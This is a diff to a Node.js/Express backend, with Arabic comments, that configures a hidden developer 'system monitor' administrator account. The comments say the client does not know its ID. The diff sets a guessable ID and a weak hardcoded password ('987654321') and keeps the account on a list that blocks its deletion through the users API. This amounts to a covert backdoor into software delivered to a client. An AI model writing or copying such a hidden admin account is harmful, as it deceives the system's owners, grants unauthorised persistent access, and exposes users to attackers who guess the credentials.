@@ -124,9 +124,9 @@ async function createDefaultAdminIfNeeded() {
 
             // حساب مراقب النظام (للمطور) - حساب خفي
             const devMonitorAdmin = new User({
-                id: 'dev_monitor_789', // رقم عضوية خاص بك لا يعرفه العميل
+                id: '999999999', // رقم عضوية رقمي وخاص بك لا يعرفه العميل
                 name: 'مراقب النظام',
-                password: 'YourSecretPassword123!', // اختر كلمة مرور قوية جداً
+                password: '987654321', // هام: غير هذا الرقم لرقم سري خاص بك، ولكن يفضل استخدام كلمة مرور قوية
                 role: 'admin'
             });
 
@@ -189,7 +189,7 @@ app.delete('/api/users/:id', async (req, res) => {
         if (!user) return res.status(404).json({ message: 'المستخدم غير موجود.' });
 
         // --- تعديل: منع حذف أي من الحسابات الإدارية الأساسية ---
-        const protectedIds = ['11111', 'dev_monitor_789'];
+        const protectedIds = ['11111', '999999999'];
         if (protectedIds.includes(user.id)) {
             return res.status(400).json({ message: 'لا يمكن حذف المدير الأصلي للنظام.' });
         }
